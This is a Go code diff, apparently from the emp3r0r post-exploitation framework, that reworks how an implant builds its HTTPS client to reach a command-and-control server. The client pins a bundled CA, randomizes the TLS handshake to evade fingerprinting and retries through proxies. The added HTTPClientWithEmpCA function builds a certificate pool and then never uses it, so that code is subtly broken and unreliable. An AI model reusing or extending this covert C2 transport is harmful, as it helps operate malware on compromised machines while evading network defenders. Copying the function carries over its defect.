@@ -29,15 +29,13 @@ func EmpHTTPClient(c2_addr, proxyServer string) *http.Client {
 		LogFatalError("Erro parsing C2 address '%s': %v", c2_addr, err)
 	}
 
-	// C2 host
-	c2_host := c2url.Hostname()
-
 	// add our cert
 	if ok := rootCAs.AppendCertsFromPEM(CACrt); !ok {
 		LogFatalError("No CA certs appended")
 	}
 
 	// Trust the augmented cert pool in our TLS client
+	c2_host := c2url.Hostname()
 	config := &utls.Config{
 		ServerName:         c2_host,
 		InsecureSkipVerify: false,
@@ -71,10 +69,31 @@ init_transport:
 			log.Printf("Proxy server down, retrying (%d)...", try)
 			goto init_transport
 		} else {
-			LogError("makeRoundTripper: %v", err)
+			log.Printf("Initializing transport (%s): makeRoundTripper: %v", c2url, err)
 			return nil
 		}
 	}
 
 	return &http.Client{Transport: tr}
+}
+
+// HTTPClientWithEmpCA is a http client with system CA pool
+// with utls client hello randomization
+// url: target URL, proxy: proxy URL
+func HTTPClientWithEmpCA(target_url, proxy string) (client *http.Client) {
+	client = EmpHTTPClient(target_url, proxy)
+	if client == nil {
+		return nil
+	}
+	client.Timeout = 5 * time.Second
+	rootCAs, err := x509.SystemCertPool()
+	if err != nil {
+		log.Printf("IsProxyOK system cert pool: %v", err)
+		rootCAs = x509.NewCertPool()
+	}
+	if ok := rootCAs.AppendCertsFromPEM(CACrt); !ok {
+		log.Printf("IsProxyOK: cannot append emp3r0r CA")
+		return nil
+	}
+	return
 }
